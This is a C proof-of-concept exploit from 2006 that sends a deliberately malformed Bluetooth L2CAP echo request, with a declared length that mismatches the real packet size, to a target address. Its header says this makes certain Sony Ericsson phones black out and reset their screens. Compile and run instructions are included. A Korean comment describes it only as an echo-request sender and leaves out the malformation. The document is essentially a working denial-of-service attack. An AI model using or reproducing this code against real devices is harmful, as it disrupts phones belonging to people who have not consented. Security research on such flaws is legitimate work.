/*	Sony/Ericsson K600i reset display - PoC			*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*	02-01-2006						*/
/*	Vulnerability found using BSS fuzzer :			*/
/*		http://securitech.homeunix.org/blue/		*/
/*								*/
/*	Causes anormal behaviours on some Sony/Ericsson 	*/
/*	cell phones 						*/
/*	Vulnerable tested devices :				*/
/*		- K 600i					*/
/*		- V 600i					*/
/*		- And maybe other ones... 			*/
/*								*/
/*	Vulnerable devices will slowly turn their screen into 	*/
/*	black and then display a white screen. 			*/
/*	After a short period (~45sec), they will go back to 	*/
/*	their normal behaviour					*/
/*								*/
/*	gcc -lbluetooth reset_display_K600i.c 			*/
/*		-o reset_display_K600i				*/
/*	./reset_display_K600i 00:12:EE:XX:XX:XX			*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		15
#define FAKE_SIZE	12

/**
 * main - 블루투스 L2CAP 에코 요청 패킷을 보내는 프로그램
 * @argc: 명령줄 인수의 수
 * @argv: 명령줄 인수의 배열
 *
 * 이 함수는 주어진 블루투스 주소로 L2CAP 에코 요청 패킷을 보낸다.
 * 1. 블루투스 소켓을 생성하고 바인딩한다.
 * 2. 주어진 블루투스 주소로 연결을 시도한다.
 * 3. 데이터 버퍼를 할당하여 에코 요청 패킷을 준비한다.
 * 4. 준비된 패킷을 소켓을 통해 전송한다.
 * 5. 전송된 패킷의 내용을 출력하고 자원을 정리한다.
 * 
 * 사용법: 프로그램 <블루투스 주소>
 * 예제: ./프로그램 00:1A:7D:DA:71:13
 *
 * 반환값: 성공 시 EXIT_SUCCESS, 실패 시 적절한 오류 메시지를 출력하고 종료
 */
int main(int argc, char **argv)
{
    char *buffer;
    l2cap_cmd_hdr *cmd;    
    struct sockaddr_l2 addr;
    int sock, sent, i;

    if(argc < 2)
    {
        fprintf(stderr, "%s <btaddr>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&addr, 0, sizeof(addr));
    addr.l2_family = AF_BLUETOOTH;

    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
    {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    str2ba(argv[1], &addr.l2_bdaddr);
    
    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) 
    {
        perror("connect");
        exit(EXIT_FAILURE);
    }
    
    if(!(buffer = (char *) malloc ((int) SIZE + 1))) 
    {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
    
    memset(buffer, 'A', SIZE);

    cmd = (l2cap_cmd_hdr *) buffer;
    cmd->code = L2CAP_ECHO_REQ;
    cmd->ident = 1;
    cmd->len = FAKE_SIZE;
    
    if( (sent=send(sock, buffer, SIZE, 0)) >= 0)
    {
        printf("L2CAP packet sent (%d)\n", sent);
    }

    printf("Buffer:\t");
    for(i=0; i<sent; i++)
        printf("%.2X ", (unsigned char) buffer[i]);
    printf("\n");

    free(buffer);
    close(sock);
    return EXIT_SUCCESS;
}
